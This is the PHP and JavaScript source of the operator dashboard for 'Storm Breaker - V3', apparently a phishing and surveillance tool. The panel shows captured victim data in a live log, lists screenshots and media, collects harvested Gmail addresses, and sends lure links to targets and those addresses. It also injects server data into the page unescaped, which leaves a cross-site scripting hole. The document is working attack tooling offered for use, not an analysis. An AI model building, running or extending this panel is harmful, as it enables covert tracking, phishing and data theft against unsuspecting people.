<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name=”viewport” content=”width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <title>Storm Breaker - V3</title>

</head>


<body id="ourbody" onload="check_new_version()">

<div id="links"></div>


<div class="mt-2 d-flex justify-content-center">
    <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="15" ></textarea>
</div>

<div class="mt-2 d-flex justify-content-center">
    <button class="btn btn-danger m-2" id="btn-start-stop">Listener Running / press to stop</button>
    <button class="btn btn-success m-2" id="btn-download" onclick="saveTextAsFile()">Download Logs</button>
    <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
    <button class="btn btn-info m-2" id="btn-screen" onclick="startScreenShare()">Start Screen Share</button>
    <a href="screenshots.php" class="btn btn-primary m-2">View Screenshots</a>
    <button class="btn btn-secondary m-2" onclick="showMediaExplorer()">Explore Media</button>
    <button class="btn btn-dark m-2" onclick="showGmailExplorer()">Gmail Explorer</button>
    <button class="btn btn-dark m-2" onclick="showWebExplorer()">Web Explorer</button>
</div>

<div id="screenContainer" class="mt-3" style="display: none;">
    <div class="d-flex justify-content-center">
        <video id="screenStream" autoplay playsinline style="max-width: 100%; border: 2px solid #333;"></video>
    </div>
    <div class="d-flex justify-content-center mt-2">
        <button class="btn btn-danger" onclick="stopScreenShare()">Stop Screen Share</button>
    </div>
</div>

<div id="mediaExplorer" class="mt-3" style="display: none;">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <h4>Send Link</h4>
                <div class="input-group mb-3">
                    <input type="text" class="form-control" id="linkInput" placeholder="Enter URL to send">
                    <button class="btn btn-primary" onclick="sendLink()">Send</button>
                </div>
            </div>
            <div class="col-md-6">
                <h4>Media Files</h4>
                <div id="mediaList" class="list-group">
                    <!-- Media files will be listed here -->
                </div>
            </div>
        </div>
    </div>
</div>

<div id="gmailExplorer" class="mt-3" style="display: none;">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <h4>Gmail Addresses</h4>
                <div id="gmailList" class="list-group mb-3">
                    <!-- Gmail addresses will be listed here -->
                </div>
                <button class="btn btn-primary" onclick="refreshGmailList()">Refresh List</button>
            </div>
            <div class="col-md-6">
                <h4>Send Link to Gmail</h4>
                <div class="input-group mb-3">
                    <input type="text" class="form-control" id="gmailLinkInput" placeholder="Enter URL to send">
                    <select class="form-control" id="gmailSelect">
                        <!-- Gmail addresses will be populated here -->
                    </select>
                    <button class="btn btn-success" onclick="sendLinkToGmail()">Send</button>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="webExplorer" class="mt-3" style="display: none;">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <h4>Web Data Collection</h4>
                <div class="input-group mb-3">
                    <input type="text" class="form-control" id="webUrlInput" placeholder="Enter URL (e.g., https://github.com/manishk701/ManiWeb.git)">
                    <button class="btn btn-primary" onclick="collectWebData()">Collect Data</button>
                </div>
                <div id="webDataList" class="list-group mb-3">
                    <!-- Web data will be listed here -->
                </div>
            </div>
            <div class="col-md-6">
                <h4>Send Link to Target</h4>
                <div class="input-group mb-3">
                    <input type="text" class="form-control" id="webLinkInput" placeholder="Enter URL to send">
                    <button class="btn btn-success" onclick="sendWebLink()">Send</button>
                </div>
                <div class="mt-3">
                    <h5>Collected Data</h5>
                    <div id="collectedData" class="list-group">
                        <!-- Collected data will be shown here -->
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>

<script>
function saveTextAsFile() {
    const textToSave = document.getElementById('result').value;
    const textToSaveAsBlob = new Blob([textToSave], {type: 'text/plain'});
    const textToSaveAsURL = window.URL.createObjectURL(textToSaveAsBlob);
    const fileNameToSaveAs = 'log.txt';

    const downloadLink = document.createElement('a');
    downloadLink.download = fileNameToSaveAs;
    downloadLink.innerHTML = 'Download File';
    downloadLink.href = textToSaveAsURL;
    downloadLink.style.display = 'none';
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
}

async function startScreenShare() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                cursor: "always"
            },
            audio: false
        });
        
        const videoElement = document.getElementById('screenStream');
        videoElement.srcObject = stream;
        document.getElementById('screenContainer').style.display = 'block';
        
        // Send stream to server
        const mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/webm'
        });
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                const formData = new FormData();
                formData.append('screen', event.data);
                
                fetch('receiver.php', {
                    method: 'POST',
                    body: formData
                });
            }
        };
        
        mediaRecorder.start(1000); // Send data every second
        
        // Handle stream stop
        stream.getVideoTracks()[0].onended = () => {
            stopScreenShare();
        };
        
    } catch (err) {
        console.error('Error accessing screen:', err);
        alert('Error accessing screen. Please make sure you have granted screen sharing permissions.');
    }
}

function stopScreenShare() {
    const videoElement = document.getElementById('screenStream');
    if (videoElement.srcObject) {
        videoElement.srcObject.getTracks().forEach(track => track.stop());
        videoElement.srcObject = null;
    }
    document.getElementById('screenContainer').style.display = 'none';
}

function showMediaExplorer() {
    document.getElementById('mediaExplorer').style.display = 'block';
    loadMediaFiles();
}

function loadMediaFiles() {
    fetch('media_explorer.php')
        .then(response => response.json())
        .then(data => {
            const mediaList = document.getElementById('mediaList');
            mediaList.innerHTML = '';
            
            data.files.forEach(file => {
                const item = document.createElement('div');
                item.className = 'list-group-item';
                item.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center">
                        <span>${file.name}</span>
                        <div>
                            <button class="btn btn-sm btn-info" onclick="previewMedia('${file.path}')">Preview</button>
                            <button class="btn btn-sm btn-success" onclick="downloadMedia('${file.path}')">Download</button>
                        </div>
                    </div>
                `;
                mediaList.appendChild(item);
            });
        })
        .catch(error => console.error('Error loading media files:', error));
}

function sendLink() {
    const link = document.getElementById('linkInput').value;
    if (!link) {
        alert('Please enter a valid URL');
        return;
    }

    fetch('send_link.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ link: link })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Link sent successfully');
            document.getElementById('linkInput').value = '';
        } else {
            alert('Error sending link: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending link');
    });
}

function previewMedia(path) {
    window.open('preview_media.php?path=' + encodeURIComponent(path), '_blank');
}

function downloadMedia(path) {
    window.location.href = 'download_media.php?path=' + encodeURIComponent(path);
}

function showGmailExplorer() {
    document.getElementById('gmailExplorer').style.display = 'block';
    loadGmailList();
}

function loadGmailList() {
    fetch('gmail_explorer.php')
        .then(response => response.json())
        .then(data => {
            const gmailList = document.getElementById('gmailList');
            const gmailSelect = document.getElementById('gmailSelect');
            
            gmailList.innerHTML = '';
            gmailSelect.innerHTML = '';
            
            data.emails.forEach(email => {
                // Add to list
                const listItem = document.createElement('div');
                listItem.className = 'list-group-item';
                listItem.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center">
                        <span>${email}</span>
                        <button class="btn btn-sm btn-danger" onclick="removeGmail('${email}')">Remove</button>
                    </div>
                `;
                gmailList.appendChild(listItem);
                
                // Add to select
                const option = document.createElement('option');
                option.value = email;
                option.textContent = email;
                gmailSelect.appendChild(option);
            });
        })
        .catch(error => console.error('Error loading Gmail list:', error));
}

function refreshGmailList() {
    loadGmailList();
}

function removeGmail(email) {
    fetch('remove_gmail.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email: email })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            loadGmailList();
        } else {
            alert('Error removing Gmail: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error removing Gmail');
    });
}

function sendLinkToGmail() {
    const link = document.getElementById('gmailLinkInput').value;
    const email = document.getElementById('gmailSelect').value;
    
    if (!link || !email) {
        alert('Please enter both URL and select a Gmail address');
        return;
    }

    fetch('send_link_gmail.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            link: link,
            email: email
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Link sent successfully to ' + email);
            document.getElementById('gmailLinkInput').value = '';
        } else {
            alert('Error sending link: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending link');
    });
}

function showWebExplorer() {
    document.getElementById('webExplorer').style.display = 'block';
    loadWebData();
}

function loadWebData() {
    fetch('web_explorer.php')
        .then(response => response.json())
        .then(data => {
            const webDataList = document.getElementById('webDataList');
            webDataList.innerHTML = '';
            
            data.items.forEach(item => {
                const listItem = document.createElement('div');
                listItem.className = 'list-group-item';
                listItem.innerHTML = `
                    <div class="d-flex justify-content-between align-items-center">
                        <span>${item.url}</span>
                        <div>
                            <button class="btn btn-sm btn-info" onclick="viewWebData('${item.id}')">View</button>
                            <button class="btn btn-sm btn-danger" onclick="removeWebData('${item.id}')">Remove</button>
                        </div>
                    </div>
                `;
                webDataList.appendChild(listItem);
            });
        })
        .catch(error => console.error('Error loading web data:', error));
}

function collectWebData() {
    const url = document.getElementById('webUrlInput').value;
    if (!url) {
        alert('Please enter a valid URL');
        return;
    }

    fetch('collect_web_data.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ url: url })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Data collected successfully');
            document.getElementById('webUrlInput').value = '';
            loadWebData();
            updateCollectedData(data.data);
        } else {
            alert('Error collecting data: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error collecting data');
    });
}

function viewWebData(id) {
    window.open('view_web_data.php?id=' + id, '_blank');
}

function removeWebData(id) {
    fetch('remove_web_data.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ id: id })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            loadWebData();
        } else {
            alert('Error removing data: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error removing data');
    });
}

function sendWebLink() {
    const link = document.getElementById('webLinkInput').value;
    if (!link) {
        alert('Please enter a valid URL');
        return;
    }

    fetch('send_web_link.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ link: link })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Link sent successfully');
            document.getElementById('webLinkInput').value = '';
        } else {
            alert('Error sending link: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending link');
    });
}

function updateCollectedData(data) {
    const collectedData = document.getElementById('collectedData');
    collectedData.innerHTML = '';
    
    Object.entries(data).forEach(([key, value]) => {
        const item = document.createElement('div');
        item.className = 'list-group-item';
        item.innerHTML = `
            <strong>${key}:</strong> ${value}
        `;
        collectedData.appendChild(item);
    });
}
</script>